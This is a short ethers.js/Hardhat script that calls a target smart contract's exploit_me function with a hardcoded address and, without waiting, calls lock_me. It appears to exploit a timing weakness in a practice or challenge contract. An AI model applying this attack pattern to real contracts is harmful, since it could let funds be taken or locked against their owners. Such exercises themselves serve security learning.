
async function main() {
    const abi = require('./contract-abi.json');
    const contractaddress = require('./contract-address.json');
    const [sign] = await ethers.getSigners();
    const myAddress = '0x2eE648bb7882d236c2aAce994Ab6143B3bc06744';
  
    console.log("Deploying contracts with the account:", sign.address);
    console.log("Account balance:", (await sign.getBalance()).toString());
    
    const targetContract = new ethers.Contract(contractaddress.address, abi.abi, sign);

    //running async function without waiting
    const result = targetContract.exploit_me(myAddress);
    // waiting on the contract to unlock
    const changeLock = await targetContract.lock_me();
    console.log("LOGGING THE CONTRACT VALUE: ", result);
  }
  
  main()
    .then(() => process.exit(0))
    .catch(error => {
      console.error(error);
      process.exit(1);
    });